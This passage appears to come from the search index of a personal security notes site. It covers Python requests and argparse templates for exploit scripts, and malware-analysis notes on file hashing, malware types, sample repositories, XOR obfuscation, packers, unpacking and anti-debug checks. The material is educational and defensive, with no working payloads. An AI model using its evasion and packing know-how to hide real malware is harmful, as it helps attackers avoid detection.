as \"data\" e.g \"foo=bar\"\nrequests.post(\"https://github.com\", data=data)\n\n# sends data as \"json\" e.g \"{'foo': 'bar'}\" \nrequests.post(\"https://github.com\", json=data)\n</code></pre>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#sending-a-file-in-the-body","title":"Sending a File in the body","text":"<pre><code>with open('readme.txt','r') as f:\n   requests.post(\"https://github.com\", files=f)\n</code></pre>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#sessions","title":"Sessions","text":""},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#creating-session","title":"Creating Session","text":"<pre><code>session = requests.Session()\nsession.get(\"https://github.com\")\n</code></pre>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#set-session-header","title":"Set Session Header","text":"<pre><code>session = requests.Session()\nsession.headers[\"Authorization\"] = \"Basic 123\"\n</code></pre>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#update-session-cookie","title":"Update Session Cookie","text":"<pre><code>session = requests.Session()\nsession.cookies.update({\"PHPSESSID\": \"fakesession\"})\n</code></pre>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#response","title":"Response","text":"<pre><code>resp_obj = requests.get(\"https://github.com\")\n\n# HTTP status code (e.g 404, 500, 301)\nresp_obj.status_code\n\n# HTTP response headers (e.g Location, Content-Disposition)\nresp_obj.headers[\"Location\"]\n\n# Body as bytes\nresp_obj.content\n\n# Body as a string\nresp_obj.text\n\n# Body as a dictionary (if body is a JSON)\nresp_obj.json()\n</code></pre>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#reusable-code","title":"Reusable Code","text":""},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#start-template","title":"Start template","text":"<pre><code>import argparse\nimport requests\n\ndef main():\n   parser = argparse.ArgumentParser()\n   parser.add_argument('-i','--IP',help='IP address',required=True)\n   parser.add_argument('-p','--proxy',help='ip address of proxy',required=False)\n   args = parser.parse_args()\n\n   print(\"Hello World!\")\n\nif __name__ == \"__main__\":\n   main()\n</code></pre>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#cli-as-a-configuration","title":"CLI as a configuration","text":"<p>One of the most compelling reason to use this is so that you can organise your commands, subcommands and their respective arguments in a dictionary thus greatly improving readability and maintainability.</p> <p>This method can be observed in apimap where nested subcommands are parsed as a python dictionary and generated dynamically. As a result we can simply change the python dictionary and it will be reflected in the CLI. </p> <p>Downside is that we will also need a second dictionary that maps the handler function to the arguments.</p> <p>Shown below is a sample <code>cli.py</code> and <code>handler.py</code>.</p>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#clipy","title":"cli.py","text":"<p>python dictionary configuration <pre><code>commands = {\n    'cmd1': {\n        'help': 'help for cmd1',\n        'args': {\n            'cmd1_args': {\n                'help': 'help for cmd1_param',\n                'type': str\n            }\n        }\n    },\n    'cmd2': {\n        'help': 'help for cmd2',\n        'subcommands': {\n            'cmd2_subcmd1': {\n                'help': 'help for cmd2_subcmd1',\n                'args': {\n                    'cmd_subcmd1_args': {\n                        'help': 'help for cmd2_subcmd1_args',\n                        'type': str\n                    }\n                }\n            },\n            'cmd2_subcmd2': {\n                'help': 'help for cmd2_subcmd2',\n                'args': {\n                    'cmd2_subcmd2_args': {\n                        'help': 'help for cmd2_subcmd2_args',\n                        'type': str\n                    }\n                }\n            }\n        }\n    },\n    'cmd3': {\n        'help': 'help for cmd3',\n        'subcommands': {\n            'cmd3_subcmd1': {\n                'help': 'help for cmd3_subcmd1',\n                'subcommands': {\n                    'cmd3_subcmd1_subcmd1': {\n                        'help': 'help for cmd3_subcmd1_subcmd1',\n                        'args': {\n                            'cmd3_subcmd1_subcmd1_args': {\n                                'help': 'help for cmd3_subcmd1_subcmd1_args',\n                                'type': str\n                            }\n                        }\n                    },\n                    'cmd3_subcmd1_subcmd2': {\n                        'help': 'help for cmd3_subcmd1_subcmd2',\n                        'args': {\n                            'cmd3_subcmd1_subcmd2_args': {\n                                'help': 'help for cmd3_subcmd1_subcmd2',\n                                'type': str\n                            }\n                        }\n                    }\n                }\n            },\n            'cmd3_subcmd2': {\n                'help': 'help for cmd3_subcmd2',\n                'subcommands': {\n                    'cmd3_subcmd2_subcmd1': {\n                        'help': 'help for cmd3_subcmd2_subcmd1',\n                        'args': {\n                            'cmd3_subcmd2_subcmd1_args': {\n                                'help': 'help for cmd3_subcmd2_subcmd1_args',\n                                'type': str\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre></p> <p>cli.py <pre><code>def generate_args(args_dict, subparser):\n    if 'subcommands' in args_dict:\n        subparsers_sub = subparser.add_subparsers(dest='subcommand', title='subcommands')\n        for subcommand, subcommand_dict in args_dict['subcommands'].items():\n            subparser_sub = subparsers_sub.add_parser(subcommand, help=subcommand_dict['help'])\n            generate_args(subcommand_dict, subparser_sub)\n    if 'args' in args_dict:\n        for arg, arg_dict in args_dict['args'].items():\n            subparser.add_argument(arg, **arg_dict)\n\ndef parse_arguments():\n    parser = argparse.ArgumentParser(description='APIMAP')\n\n    subparsers = parser.add_subparsers(title='subcommands', dest='command')\n    subparsers.required = True\n\n    # Generate the command-line arguments based on the dictionary\n    for command, command_dict in commands.items():\n        command_parser = subparsers.add_parser(command, help=command_dict['help'])\n        generate_args(command_dict, command_parser)\n\n    return parser.parse_args()\n\nif __name__ == '__main__':\n    args = parse_arguments()\n</code></pre></p>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#handlerpy","title":"handler.py","text":"<p>python dictionary configuration <pre><code>command_handlers = {\n    'cmd1': handle_cmd1,\n    'cmd2': {\n        'cmd2_subcmd1': handle_cmd2_subcmd1,\n        'cmd2_subcmd2': handle_cmd2_subcmd2\n    },\n    'cmd3': {\n        'cmd3_subcmd1_subcmd1': handle_cmd3_subcmd1_subcmd1,\n        'cmd3_subcmd1_subcmd2': handle_gen_cmd3_subcmd1_subcmd2,\n        'cmd3_subcmd2_subcmd1': handle_cmd3_subcmd2_subcmd1\n    }\n}\n</code></pre></p> <p>handler.py <pre><code># define the handlers here\n# handlers can be imported too\n\ndef handle_commands(args):\n    command = args.command\n    handler = command_handlers.get(command)\n\n    if handler is None:\n        print(f\"Invalid command: {command}\")\n        return\n\n    if callable(handler):\n        handler(args)\n    elif isinstance(handler, dict):\n        subcommand = args.subcommand\n        subcommand_handler = handler.get(subcommand)\n\n        if subcommand_handler is None:\n            print(f\"Invalid subcommand: {subcommand}\")\n            return\n\n        if callable(subcommand_handler):\n            subcommand_handler(args)\n        else:\n            handle_commands(args, subcommand_handler)\n    else:\n        print(f\"Invalid command handler: {handler}\")\n</code></pre></p>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#tips","title":"Tips","text":""},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#meaningful-messages","title":"Meaningful Messages","text":"<pre><code>print('[+] Exploit has succeeded') \nprint('[-] Exploit has failed')\nprint('[=] Running Process')\n</code></pre>"},{"location":"Malware_Analysis/Notes/File_Identification%26Classification/","title":"File Identification and Classification","text":"<ul> <li>the process of identifying the file type and obtaining a unique 'signature' </li> <li>file identification will help build basic detection methods and Indicators of Compromise (IOC)</li> <li>will help decide which tools to use during analysis</li> </ul>"},{"location":"Malware_Analysis/Notes/File_Identification%26Classification/#steps-in-file-identification","title":"Steps in File Identification","text":""},{"location":"Malware_Analysis/Notes/File_Identification%26Classification/#1-identify-file-type","title":"1. Identify File Type","text":"<ul> <li>Two types of file in a computer system : </li> <li>ASCII (Plain Text) Files : can be read with any text editor like HTML, MD, XML, TXT etc.</li> <li>Structured (Binary) Files : where the file has its owm structure to represent its content, like PDF, EXE etc.</li> <li>Usually, file type can be identified based on their icon and extension, but it is not uncommon to find malicious files masquerading as another file type like EXE file stored with JPG extension.</li> <li>Hence we will need to use tools such as Hex editor to comparing the header manually or using tools like file command in linux to verify the file type.</li> <li>We can compare the signature with the information found on this website Compilation of File Header and Tail Signature.</li> </ul>"},{"location":"Malware_Analysis/Notes/File_Identification%26Classification/#2-classify-with-file-hash","title":"2. Classify with File Hash","text":"<ul> <li>after determining the file type, we will need to determine if the sample is an already known malware like it belongs to a certain malware family, or even an APT group.</li> <li>therefore hashes, a unique fixed size string generated from passing the bianries into the hashing algorithm is a way to fingerprint the file and used as an IOC. </li> <li>This signature/fingerprint can then be searched for its existence on databases such as VirusTotal and if hashes match, we will already have knowledge base on how to handle the sample.  </li> <li>Hashing used : MD5, SHA1, SHA256, FuzzyHash, ImpHash</li> <li>Tools used : certutil, md5sum, sha1sum, sha256sum, HashMyFiles(nirsoft), Hasher(Zimmerman)</li> </ul>"},{"location":"Malware_Analysis/Notes/File_Identification%26Classification/#hashes-vs-polymorphism","title":"Hashes vs Polymorphism","text":"<ul> <li>1 bit change in the file will change the hash of the file significantly, and this is an issue with polymorphic malware (malware that can modify themselves).</li> <li>There are three methods that can be used to deal with polymorphic malware and they are : </li> <li>Fuzzy Hashing    <ul> <li>works by segmenting the file and then hashing the segmented file. Afterwhich a mathematical function is run over it to generate a value. </li> <li>This value generated is then compared to other files within a database and we are provided with the statistics of how similar the sample is to the ones seen in the database.</li> </ul> </li> <li>Import Hash (ImpHash)<ul> <li>When malware is compiled, the linker will generate and build the Import Address Table (IAT) based on how the functions are ordered in the code.</li> <li>If threat actors are using the same logic, but with slight modifications, a hash of the IAT would still remain the same </li> </ul> </li> <li>Section Hash</li> </ul>"},{"location":"Malware_Analysis/Notes/File_Identification%26Classification/#3-strings","title":"3. Strings","text":"<ul> <li>a sequence of ASCII or Unicode characters represented in hexadecimal. </li> <li>Most strings are implemented using arrays and usually terminated with null.</li> <li>There are two types of strings namely printable and non-printable and common non-printable strings are like \"\\n\" and \"\\r\" which in hex is \"\\x0a\" and \"\\x0d\" respectively.</li> <li>Non-exhaustive list of information obtained with strings : </li> </ul> Internal/External Messages The Sample uses Function being referenced Sections used by the PE IP Addresses / Domain Names Error handling Messages Other Names, Keywords"},{"location":"Malware_Analysis/Notes/File_Identification%26Classification/#identifying-obfuscation","title":"Identifying Obfuscation","text":"<ul> <li>Obfuscation is a method threat actors use to hide their malware, circumvent detection methods and hinder analysis.</li> <li>The idea is to modify the code in such a way that it is difficult to understand the program while still preserving its functionality.</li> <li>Obfuscation is not only used for malicious purposes, it is also used in software copyright protection or in digital rights management. </li> <li>Modifications can be in the form of : </li> <li>packing</li> <li>code transformations</li> <li>compression, encoding or encryption.</li> </ul>"},{"location":"Malware_Analysis/Notes/File_Identification%26Classification/#3-basic-things-to-look-out-for-obfuscation","title":"3 Basic Things to Look Out For Obfuscation","text":""},{"location":"Malware_Analysis/Notes/File_Identification%26Classification/#1-check-for-abnormal-pe-section","title":"1. check for Abnormal PE Section","text":"<ul> <li>checking for abnormal section names, but this can be easily changed and hence not a good indicator.</li> <li><code>.text</code> section with zero raw on-disk size as compared to its virtual memory size.<ul> <li>a probable explanation to <code>.text</code> section with no data on disk is that the program will use the section in memory to load its code and execute from memory. </li> </ul> </li> <li>comparing PE characteristics flag.</li> <li>comparing section flags<ul> <li>look out for contains uninitialised data</li> </ul> </li> </ul>"},{"location":"Malware_Analysis/Notes/File_Identification%26Classification/#2-check-apis-used","title":"2. check APIs used","text":"<ul> <li>check the API used by the sample and check if there is any encoding, encryption related API</li> <li>Tools that can be used to check APIs used : PEiD and Detect it Easy (DiE)</li> </ul>"},{"location":"Malware_Analysis/Notes/File_Identification%26Classification/#3-entropy","title":"3. Entropy","text":"<ul> <li>Entropy is a mathematical equation used to measure randomness. The idea is that when obfuscation is applied, level of randomness increases and therefore a high entropy suggests obfuscation. </li> <li>However, entropy is not a surefire method to check for obfuscation, as stated above, high entropy merely suggests that sample is obfuscated, further checks like checking API used and checking for abnormal PE sections are needed to ascertain obfuscation.</li> </ul> <p>The three methods stated above are basic methods, and are just \u201cfirst cut\u201d checks.</p>"},{"location":"Malware_Analysis/Notes/File_Identification%26Classification/#scanners-sandboxes","title":"Scanners &amp; Sandboxes","text":"<ul> <li>A scanner is a software with the capability of scanning a file and deciding whether it is benign or malicious for e.g antivirus software.</li> <li>A sandbox is a software that uses a security mechanism of creating an isolated or controlled environment and allows a program to run inside it for e.g virtual machines.</li> </ul>"},{"location":"Malware_Analysis/Notes/File_Identification%26Classification/#scanner","title":"Scanner","text":"<ul> <li>Scanners can be running on host computer, network or on a remote server hosted by a separate vendor as such there are two types of scanners namely online and offline. </li> <li>Offline Scanners example : ClamAV, Malwarebytes, AV softwares etc.</li> <li>It is the responsibility of the user to update the signature database of the offline scanner.</li> <li>Online Scanners example : Virus Total, Hybrid Analysis. </li> <li>Caution : Not to upload samples to online scanners in the middle of an investigation or a secret investigation. Malware authors have access to these online scanner databases and you run the risk of malware authors finding out and destroying the malware before any meaningful investigation can be done.  </li> </ul>"},{"location":"Malware_Analysis/Notes/File_Identification%26Classification/#sandbox","title":"Sandbox","text":"<ul> <li>The sandbox of interest is one that can create a virtual environment for sample to be tested or observed in. </li> <li>Scanners are after all still softwares themselves and hence they can be vulnerable and exploited or can be bypassed. As such they should be used as an assistance not a panacea for malware analysis. </li> <li>Common malware analysis sandbox is cuckoo </li> <li>Here and here is list of other scanners and sandbox.</li> </ul>"},{"location":"Malware_Analysis/Notes/Introduction/","title":"Introduction","text":""},{"location":"Malware_Analysis/Notes/Introduction/#what-is-malware-analysis","title":"What is Malware Analysis","text":"<ul> <li>Malware Analysis is the art of dissecting the malware (malicious Software) to answer three main questions : </li> <li>How does it work?</li> <li>How can it be detected?</li> <li>How can the threat be eliminated ?</li> <li>It is an art as the techniques to analysis differs based on personality. As such, what is in this note is my interpretation of malware analysis.</li> <li>The end goal of MA is to identify the signature of the malware and detect similar or the same malware based on these signature which are also known as Indicators of Compromise (IOCs).</li> </ul>"},{"location":"Malware_Analysis/Notes/Introduction/#malware-analysis-ma-vs-reverse-engineering-re","title":"Malware Analysis (MA) vs Reverse Engineering (RE)","text":"<ul> <li>MA and RE are two different skillset but RE is complementary to MA.</li> <li>RE is the art of dissecting a product to understand its blueprint and it helps to answer the three mains questions MA set out to answer.</li> </ul>"},{"location":"Malware_Analysis/Notes/Introduction/#types-of-malware","title":"Types of Malware","text":"<ul> <li>Malware need not only be from one class, it is classified as below :  </li> </ul> Type Definition Type Definition Virus malware that infects the target and requires user intervention to copy itself and spread to other computer or systems Worm Similar to virus, but just that it does not require human intervention to spread. Scareware malware that uses social engineering to trick user into buying or downloading unwanted software Ransomware Malware that lock's or encrypt's the victim's sensitive information/data and blackmailing the user for decryption Botnet A group of system infected with the same malware controlled by the attacker through a Command &amp; Control (C2) server usually used for DDoS attack. Trojan Software that behaves like a regular program but has malicious code running within it. Spyware Malware that attacker use to eavesdrop, gather information or destroy the victim's machine Rootkit malware that evades detection by hiding in the system Keylogger malware that logs a user's keystroke Logic Bomb A code or portion of code that remains dormant for a period of time and triggered only when the time is right or with certain triggers Backdoor/RAT a malware that gives attacker remote access to the user's system Information Stealer malware whose main purpose is to steal infromation and exfiltrate it back Downloader malware that is paired with other malware, that helps to download and install the other malware Dropper Malware thar has another malware executable embedded within. Adware malware that gives user unwanted advertisements ### Malware Sample Resources * Below is a non-exhaustive list of web pages that contains malware samples Completely Free Free but needs Registration Commercial theZoo 1 and 2 Hybrid Analysis Hybrid Analysis malware traffic analysis Any.Run Any.Run Malware-Samples Virus Share VirusTotal TekDefense Malware Samples Malware Bazaar Inquest Malware Samples MalShare Contagio"},{"location":"Malware_Analysis/Notes/Introduction/#analysis-techniques","title":"Analysis Techniques","text":"<p>!!!Important!!!  * There is no need to waste time, effort and resources to understand every single instruction and detail that does not answer the three core questions above. </p> <p>!!!Important!!! </p>"},{"location":"Malware_Analysis/Notes/Introduction/#static","title":"Static","text":"<ul> <li>Static Analysis is done by dissecting the malware without executing it.</li> <li>Basic : analysis of file, file structure, imported and exported function etc.</li> <li>Advanced : attempt to understand the malware based on the low-level instruction used using disassembler and/or decompiler</li> </ul>"},{"location":"Malware_Analysis/Notes/Introduction/#dynamic","title":"Dynamic","text":"<ul> <li>Dynamic Analysis is done by dissecting the malware by executing it and monitoring its behaviour.</li> <li>Basic : analyst runs sample in a contained environment (sandbox) with different monitoring tools pre-installed and tries to understand malware behaviour through output of the tools</li> <li>Advanced : basic analysis does not give a clear picture and sample is runned through a debugger so that analyst can have more control in the execution of the malware.</li> </ul>"},{"location":"Malware_Analysis/Notes/Introduction/#breakdown-of-analysis-and-its-feasibility","title":"Breakdown of Analysis and Its Feasibility","text":""},{"location":"Malware_Analysis/Notes/Introduction/#tool-list","title":"Tool list","text":"<ul> <li>Tools change with time, but the nature of the tool remains the same. Hence it is more important to understand the nature of the tool than the tool in specific.</li> <li>Tools needed for MA are classified as such: </li> </ul> S/N Tool Name S/N Tool Name 1 File Format Analyser 4 Virtualisation Tools i.e VMs 2 System Monitoring Tools 5 Other tools like data converters, decryptors, registry tools etc. 3 Debuggers and Disassemblers 6 IDE to write custom script."},{"location":"Malware_Analysis/Notes/Introduction/#hardware-requirement","title":"Hardware Requirement","text":"CPU RAM SSD/HDD Network Card Minimum AMD or Intel 4+ Core 16gb 512gb 1Gbps Recommended AMD or Intel 8+ Core 32gb 52gb 1Gbps"},{"location":"Malware_Analysis/Notes/Introduction/#dfir-focused-os","title":"DFIR Focused OS :","text":"<ol> <li>SecurityOnion</li> <li>Tsurugi Linux</li> <li>Windows 10</li> </ol>"},{"location":"Malware_Analysis/Notes/Introduction/#virtual-machine-hypervisor","title":"Virtual Machine Hypervisor","text":"<ul> <li>The brand of VM used VMware or Virtualbox is not important, what is most important is to have a golden image by doing snapshot.</li> </ul>"},{"location":"Malware_Analysis/Notes/Introduction/#acquisition-tools","title":"Acquisition Tools","text":""},{"location":"Malware_Analysis/Notes/Introduction/#disk-imaging-tools","title":"Disk Imaging tools","text":"Open Source Functions Commercial Functions FTK Imager Acquire Hard or removable drives and memory Belkasoft Acquires Hard or removable drive, mobile devices, memory, cloud Magnet Aqcuire Acquire iOS and Android Devices as well as hard or removable media"},{"location":"Malware_Analysis/Notes/Introduction/#memory-acquisition-tools","title":"Memory Acquisition Tools","text":"Open Source Commercial Nirsoft memdump Dumpit(beta) Belkasoft Ram Capturer Magnet Ram Capturer"},{"location":"Malware_Analysis/Notes/Introduction/#system-restore-tools","title":"System Restore Tools","text":"S/N Tool Name S/N Tool Name 1 Shadow Defender 3 RollbackRX Professional 2 DeepFreeze"},{"location":"Malware_Analysis/Notes/Introduction/#other-tools","title":"Other Tools","text":"Open Source Functions KAPE Efficient Triage program that targets most forensically useful artifacts and parses it Rawcopy Copying files offf ntfs volume by using low level disk reading methods GRR rapid response Open Source EDR (Endpoint Detection and Response) osquery Open Source EDR Velociraptor Open Source EDR"},{"location":"Malware_Analysis/Notes/Introduction/#tools-for-static-analysis","title":"Tools for Static Analysis","text":""},{"location":"Malware_Analysis/Notes/Introduction/#file-format-analyser","title":"File Format Analyser","text":"S/N Tool Name 1 CFF Explorer 2 DetectItEasy 3 PE Explorer ### Debuggers, Disassembler and Decompiler S/N Tool Name ----- ----------- 1 IDA Pro 2 Cutter 3 OllyDbg ## Tools for Dynamic Analysis ### Sysinternals S/N Tool Name --- --- 1 Process Explorer 2 WinObj 3 ListDLLs.exe ### Common Tools Name Functions ------------------ -------------------------------------------------------------------------------------------------------------------------------------------------------------------- ProcDOT A tool that can visualise and correlate process activities and network traffic Fiddler * A web debugging proxy tool to log all HTTP(S) traffic between computer and the internet.  * Can be used to intercept traffic of malware that uses HTTP(S) for C2. DependencyWalker A tool that can scan Windows executables and build a hierarchy of libraries and functions that are being referenced by the executable. RegShot * Tools that provides the capability to compare between two registry snapshots. * It can also be configured to compare changes to a file or directory. Process Hacker An extended Process Explorer with powerfeatures like searching and dumping strings from specific memory regions of running processes. ### Other Tools S/N Tool Name --- --- 1 Noriben 2 API Monitor 3 PE Capture 4 FireEye ApateDNS"},{"location":"Malware_Analysis/Notes/Introduction/#offline-sandboxes","title":"Offline Sandboxes","text":"S/N Tool Name S/N Tool Name 1 Cuckoo Sandbox 2 Sandboxie"},{"location":"Malware_Analysis/Notes/Introduction/#online-sandboxes","title":"Online Sandboxes","text":"S/N Tool Name S/N Tool Name 1 VirusTotal 4 Joe Sandbox 2 Hybrid Analysis 5 Malwr 3 ANY.RUN"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/","title":"Windows Obfuscation Techniques","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#introduction","title":"Introduction","text":"<ul> <li>obfuscation is a method used to transform binary and textual and textual data into unreadable form and/or hard to understand.</li> <li>There are three broad categories of obfuscation : encoding, encryption and packing.</li> <li>Generally, obfuscation are used to : <ol> <li>hide C2 communication</li> <li>avoid detection by signature-based tools (AV, IDS, IPS,  yara etc.)</li> <li>obscure strings used in malicious binary to protect against static analysis</li> </ol> </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#encodingencryption-techniques","title":"Encoding/Encryption Techniques","text":"<ul> <li>malware authors can add garbage lines of code or change the the execution order of the actual code without altering the inner instructions in the program to evade signature based malware detection.</li> <li>They can also use a combination of encryption/encoding techniques to make the identification of the crypto scheme difficult.</li> <li>Simple Arithmetic</li> <li>where basic mathematical operation (addition,subtraction,multiplication,division) is done at byte level to encrypt / decrypt the file.</li> <li>Caesar Cipher</li> <li>substitution of letters in the plaintext with another letter in the alphabet by shifting the letters by a fixed number of positions.</li> <li>XOR Cipher<ul> <li>Interesting feature of <code>XOR</code> is that you can retrieve the plaintext from ciphertext by simply XORing with the encryption key, which means that the encryption and decryption function is the same.</li> <li>Another interesting feature of <code>XOR</code> is that XORing a null byte (<code>0x00</code>) with the a value will yield they value.<ul> <li>Example <code>0x05 XOR 0x00 = 0x05</code></li> <li>therefore encoding with XOR can leak to single byte <code>XOR</code> key leak if null byte exists and partial key leaks for multi-byte <code>XOR</code>.</li> <li>Thus malware author will ignore null bytes during encoding process so that key is not leaked. </li> </ul> </li> <li>There are also 2 other mechanisms used by malware author to prevent XOR deobfuscation : <ol> <li>Use a 2 cycle approach, where the executable is xor-ed once with one key value at first and then xor-ed again with another key value.</li> <li>use a loop to increase XOR value. </li> </ol> </li> <li>There are two types of XOR cipher Single-Byte and Multi-Byte.</li> </ul> </li> </ul> Single Byte XOR Multi Byte XOR What is it? application of a  function on each byte  of the plaintext  with the encryption key  not more than 1 byte <code>0xFF</code> application of XOR function with a key of more than 1 byte, thus XORing a number of bytes  at a time based on the length of  the key used. Tools - XORSearch - ConverterNET  - Balbuzard - unXOR - Cyberchef - brxor.py - NoMoreXOR.py - xortool Bruteforce - Easy as there is only 0xFF  number of keys - Difficult as the permutations on  the number of key is way more Null byte Key Leak Full disclosure of key  if null byte is not ignored Partial Disclosure of key if null byte  is not ignored <ol> <li>Base64 Encoding</li> <li>Base64 Encoding Details</li> </ol>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#packer-and-cryptors","title":"Packer and Cryptors","text":"<ul> <li>a packer is a software that obfuscate an executable by compressing its content and generating a new executable.</li> <li>A cryptor functions simlar to a packer but encrypts the executable instead.</li> <li>Malware authors use packers and/or cryptors to obfuscate their binaries and make it less detectable by AV and harder to do static analysis/reverse engineer.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#signs-of-packing","title":"Signs of Packing","text":"Unusually Low number of Imports Imports where there is only <code>LoadLibrary</code> or <code>GetProcAddress</code>. amount of code is smaller than usual (can be viewed with IDA pro) Unusually low number of strings High Entropy Unusual section which may indicate the specific packer used.   - e.g UPX0, UPX1 suggesting the use of UPX abnormal size of sections analysis program (DiE/OllyDbg) indicating signs of packing."},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#packing-unpacking-process","title":"Packing &amp; Unpacking Process","text":"<pre><code>graph TD\nsubgraph Packing\na[Original EXE]--&gt;|Compress Content|b[Obfuscated EXE]--&gt;|add unpack stub|c[Obfuscated EXE + Unpack Stub]--&gt;|change entry point &lt;br&gt;to unpack stub|d[Packed EXE]\nend\n\nsubgraph Unpacking\n1[Packed EXE]--&gt;|Runs Unpack Stub|2[Extracted Original EXE]--&gt;|transfer control to original OEP|3[Original EXE runs]\nend</code></pre> <p>{ width=\"650\" }</p>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#unpacking","title":"Unpacking","text":"<ul> <li>The unpacking stub will do 3 actions :<ol> <li>Unpack packed executable and load it into memory</li> <li>Fix the import table of the executable so that import can be resolved.</li> <li>Point to the original executable's OEP(Original Entry Point).</li> </ol> </li> <li>Finding the Tail Jump is the main goal of unpacking. It can be thought of as the last step of the unpacker where the next step through will lead you to the original OEP of the executable. </li> <li>Tail Jump can come in the form of a <code>jmp</code> instruction and in more sophisticated cases a <code>ret</code> or <code>call</code> instruction. OS functions like <code>NtContinue</code> or <code>ZwContinue</code> </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#approaches-in-unpacking","title":"Approaches in Unpacking","text":"Approach Explanation 1 - Unpacking Stub uses <code>LoadLibrary</code> &amp; <code>GetProcAddress</code> functions   - The stub reads the import information of the original file and uses  <code>LoadLibrary</code> to load the DLL in memory and then <code>GetProcAddress</code> to get  the addresses of the functions that the executable imports 2 - Packer does not tamper with the original import table - The unpacking stub will have a loader to load the DLL and imported functions  an their addresses in memory - This method lacks stealth and is usually used in packers that focuses on  compression and performance rather than security. 3 - Packer will keep one import function from the original import table from each DLL imported  so that only one function is revealed. - stealthier than Approach 2 and much simpler to implement than Approach 1 as there is no need to  load libraries but it still is required to resolve the functions that it requires. 4 - Unpacker stub will have no libraries and need to search for functions needed and  rebuild the import table in runtime   - An alternative will be that the unpacking stub searches for <code>LoadLibrary</code> and <code>GetProcAddress</code> functions and use them to find other libraries  - This is the stealthiest approach in packing"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#methods-in-unpacking","title":"Methods in Unpacking","text":"<ul> <li>Unpacking cannot recreate the original executable. </li> <li>The goal of unpacking is to define the behaviour of the executable - to get the binary that exhibits the same behaviour as the original. </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#automated-static-unpacking","title":"Automated Static Unpacking","text":"<ul> <li>Using a software that acts like the unpacking stub to decompress and/or decrypt the packed file.</li> <li>It is the fastest method and also the \"safest\" method as it can restore the executable without running it.</li> <li>However, these type of unpackers are usually built for specific version of packer and are rare.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#automated-dynamic-unpacking","title":"Automated Dynamic Unpacking","text":"<ul> <li>A software that is able to <ol> <li>identify the end of the execution of the unpacking stub the executable </li> <li>run the unpacking stub that is embedded on the packed file </li> <li>automatically rebuilds the import table and dumps out the unpacked executable.</li> </ol> </li> <li>Tools : PE Explorer Plugins, CFF Explorer(UPX only)</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#manual-unpacking","title":"Manual Unpacking","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#method-1-reverser-program","title":"Method 1 - Reverser Program","text":"<ul> <li>Writing a Reverser Program based on the packing algorithm.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#method-2-dynamic-unpacking","title":"Method 2 - Dynamic Unpacking","text":"<ul> <li>The idea is to run the packed library and set a breakpoint at the instruction right before <code>jmp</code> OEP. Then we step over to the next instruction where it will <code>jmp</code> to the OEP and dump the unpacked process in the memory to disk. We then proceed to fix the Import Address Table (IAT) of the dumped file. <ul> <li>This is a good illustration of the above Dynamic Unpacking method.</li> </ul> </li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#common-packers","title":"Common Packers","text":"S/N Packer Description 1 UPX - free, open source and multi-platform.  - focuses more on performance than security  - UPX application has both pack and unpack functionality  - Pack  <code>upx -o &lt;packed_name&gt; &lt;unpacked&gt;</code> - Unpack  <code>upx -d -o &lt;unpacked_name&gt; &lt;packed&gt;</code>  - Many malware will appear to be packed with UPX but more often than not it is a modified UPX where the commands above will not be useful  2 PE Compact - Commercial packer that focuses on performance  - obfuscates code and has anti-debug features  - is extensible by third party plugins making unpacking even more difficult  - OllyDbg needs to be configured to pass exceptions  - Tail Jump method can be done, requires to look for a <code>jmp eax</code> that precedes many <code>0x00</code> bytes 3 ASPack - Commercial packer focused on security  - uses different anti-debugging techniques like self-modifying code to complicate setting of breakpoints and software breakpoints may crash the program  - There are automated unpackers but the effectiveness varies 4 Petite - Free packer that is focused on performance - employs various anti-debug techniques like single-step exceptions  - the import table is untouched, thus Static Analysis can still be done 5 WinUpack(GUI) / Upack (CLI) - Focus is on compression not security - Some anti-debugging techniques employed to counter OllyDump or searching for tail jump"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#anti-analysis-techniques","title":"Anti-Analysis Techniques","text":"<ul> <li>Malware authors use a series of mechanisms within their code to make analysis difficult. They do so by preventing the analyst from having the environment to run, debug or disassemble the malware.</li> <li>These series of mechanisms could be the use Win32 APIs, Registry Key Value, code-level code and logic obfuscation.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#anti-debug-techniques","title":"Anti-Debug Techniques","text":"<ul> <li>techniques used by malware authors to ensure that a program is not running under a debugger.</li> <li>The Windows API is a widely used tool to detect the presence of debuggers.</li> </ul>"},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#isdebuggerpresent","title":"<code>IsDebuggerPresent</code>","text":""},{"location":"Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/#description1","title":"Description<sup>1</sup>","text":"<ul> <li>Determines whether the calling 